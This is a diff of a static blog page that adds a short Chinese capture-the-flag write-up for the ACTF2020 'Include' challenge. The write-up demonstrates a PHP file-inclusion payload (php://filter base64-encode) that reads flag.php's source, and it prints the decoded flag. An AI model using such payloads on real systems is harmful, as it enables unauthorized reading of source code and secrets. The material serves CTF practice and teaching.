@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>Categories: Tool | 66+144</title>
+    <title>ACTF2020-Include | 66+144</title>
     <meta name="author" content="LUEFLAM" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -31,6 +31,10 @@
 
 
 <script src="/MIA/js/lib/preview.js"></script>
+
+
+
+
 
 
 
@@ -144,25 +148,20 @@
 </transition>
 
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
-            <div id="archives">
-    
-    <div class="categories-tags">
-        
-        
-        
-        <span>
-            <a href="/MIA/categories/CTF-Hard/" style="background: #CD5C5C">
-                <span class="icon">
-                    <i class="fa-solid fa-bookmark fa-fw"></i>
-                </span>
-                CTF_Hard
-            </a>
+            <div class="article">
+    <div>
+        <h1>ACTF2020-Include</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/11/6
         </span>
         
-        
-        
-        <span>
-            <a href="/MIA/categories/CTF-Easy/" style="background: #ff7d73">
+        <span class="category">
+            <a href="/MIA/categories/CTF-Easy/">
                 <span class="icon">
                     <i class="fa-solid fa-bookmark fa-fw"></i>
                 </span>
@@ -171,83 +170,52 @@
         </span>
         
         
-        
-        <span>
-            <a href="/MIA/categories/CTF-Middle/" style="background: #CD5C5C">
-                <span class="icon">
-                    <i class="fa-solid fa-bookmark fa-fw"></i>
-                </span>
-                CTF_Middle
-            </a>
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/MIA/tags/CTF/" style="color: #ffa2c4">CTF</a>
+            </span>
+            
         </span>
-        
-        
-        
-        <span>
-            <a href="/MIA/categories/for-fun/" style="background: #ffa2c4">
-                <span class="icon">
-                    <i class="fa-solid fa-bookmark fa-fw"></i>
-                </span>
-                for_fun
-            </a>
-        </span>
-        
-        
-        
-        <span>
-            <a href="/MIA/categories/Tool/" style="background: linear-gradient(120deg, #9abbf7 0%, #ffbbf4 100%)">
-                <span class="icon">
-                    <i class="fa-solid fa-bookmark fa-fw"></i>
-                </span>
-                Tool
-            </a>
-        </span>
-        
-        
-        
         
     </div>
     
-    <div class="timeline">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2023/10/16</div>
-            <a href="/MIA/2023/10/16/hell-no/">
-                <h3>little things tbc</h3>
-            </a>
-            <div class="info">
-                
-                <span class="category">
-                    <a href="/MIA/categories/Tool/">
-                        <span class="icon">
-                            <i class="fa-solid fa-bookmark fa-fw"></i>
-                        </span>
-                        Tool
-                    </a>
-                </span>
-                
-                
-                <span class="tags">
-                    <span class="icon">
-                        <i class="fa-solid fa-tags fa-fw"></i>
-                    </span>
-                    
-                    
-                    <span class="tag">
-                        
-                        <a href="/MIA/tags/TOOLs/" style="color: #ff7d73">TOOLs</a>
-                    </span>
-                    
-                    <span class="tag">
-                        
-                        <a href="/MIA/tags/LEARN/" style="color: #ffa2c4">LEARN</a>
-                    </span>
-                    
-                </span>
-                
-            </div>
-        </div>
+    <div class="content" v-pre>
+        <p>非常简单入门级别的一道题目</p>
+<span id="more"></span>
+
+<h1 id="file-xxx"><a href="#file-xxx" class="headerlink" title="?file&#x3D;xxx"></a>?file&#x3D;xxx</h1><p>用burp suite读取到（其实直接看URL也能看到，本题属于hackbar都不用的）：</p>
+<pre><code class="http">GET /?file=flag.php HTTP/1.1
+</code></pre>
+<hr>
+<h1 id="php-filter"><a href="#php-filter" class="headerlink" title="&#x3D;php:&#x2F;&#x2F;filter"></a>&#x3D;php:&#x2F;&#x2F;filter</h1><ul>
+<li><p>1.php:&#x2F;&#x2F;filter 可以获取指定文件源码，<code>php://filter</code>与包含函数结合时，<code>php://filter</code>流会被当作php文件执行。<br>所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。</p>
+</li>
+<li><p>2.<code>php://filter</code>伪协议文件包含读取源代码，加上<code>(read=)convert.base64-encode</code>，（那个<code>read=</code>本题可以不用添加），用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。</p>
+</li>
+</ul>
+<hr>
+<h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><pre><code class="http">http://xxx.com/?file=php://filter/convert.base64-encode/resource=flag.php
+</code></pre>
+<p>得到<code>PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MDc1MmI3NDYtZWI2Yi00NjZkLWE4MWMtNGYzZTdhYWNjYzQ3fQo=</code><br>因为是经过base64编码后输出的结果，所以进行base64解码后可以得到：</p>
+<pre><code class="php">&lt;?php
+echo &quot;Can you find out the flag?&quot;;
+//flag&#123;0752b746-eb6b-466d-a81c-4f3e7aaccc47&#125;
+</code></pre>
+<p>也就得到了flag。</p>
+
     </div>
+    
+    
+    
+    
+    
+    
     
 </div>
 
@@ -279,6 +247,12 @@
         
     </div>
     <script src="/MIA/js/main.js"></script>
+    
+    
+
+
+
+
     
 </body>
 </html>
